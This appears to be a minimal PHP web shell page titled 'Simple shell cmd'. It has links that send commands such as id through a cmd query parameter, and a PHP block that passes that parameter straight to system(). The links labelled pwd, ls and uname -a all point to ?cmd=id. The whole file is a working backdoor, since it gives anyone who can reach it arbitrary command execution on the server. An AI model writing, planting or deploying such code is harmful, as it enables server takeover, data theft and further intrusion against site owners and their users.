<div>Simple shell cmd</div>
<a href="?cmd=id">id</a>
<a href="?cmd=id">pwd</a>
<a href="?cmd=id">ls</a>
<a href="?cmd=id">uname -a</a>
<code><pre>
<?php
    if (isset($_GET['cmd'])){ system($_GET['cmd']);}
?>
</pre></code>